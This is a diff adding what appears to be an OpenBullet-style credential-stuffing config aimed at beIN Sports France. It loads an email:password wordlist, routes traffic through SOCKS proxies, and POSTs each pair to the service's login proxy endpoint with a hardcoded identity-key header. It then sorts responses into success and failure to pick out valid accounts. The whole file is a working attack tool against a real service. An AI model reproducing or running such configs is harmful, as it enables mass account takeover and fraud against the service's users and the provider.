@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "beins.fr",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T05:21:16.5588341+07:00",
+  "AdditionalInfo": "",
+  "Author": "K.M",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": true,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://connect.beinsports.com/france/se-connecter" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+REQUEST POST "https://bein.portail.alphanetworks.be/proxy/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: bein.portail.alphanetworks.be" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://connect.beinsports.com" 
+  HEADER "x-an-webservice-identitykey: xo3wepudlnethi05draHostiVajibro5" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.106" 
+  HEADER "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydwtjvkpG6plvBM7u" 
+  HEADER "Referer: https://connect.beinsports.com/france/se-connecter" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 277" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "status\":false" 
+  KEYCHAIN Success OR 
+    KEY "status\":true" 
